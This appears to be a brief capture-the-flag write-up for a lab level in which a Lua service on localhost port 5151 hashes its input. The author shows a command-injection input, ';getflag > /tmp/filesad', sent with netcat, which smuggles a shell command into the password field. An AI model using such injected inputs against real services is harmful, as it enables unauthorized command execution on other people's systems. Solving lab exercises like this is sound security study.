the lua script has a hash that despite being 30 minutes finding that is NotSoEasy is not the password -_-'''

from the other side as it is executing the ...pass... variable on hash function we can inject getflag like this 

netcat localhost 5151 < a

where a is a file containing:

;getflag > /tmp/filesad

and then you only need to cat /tmp/filesad
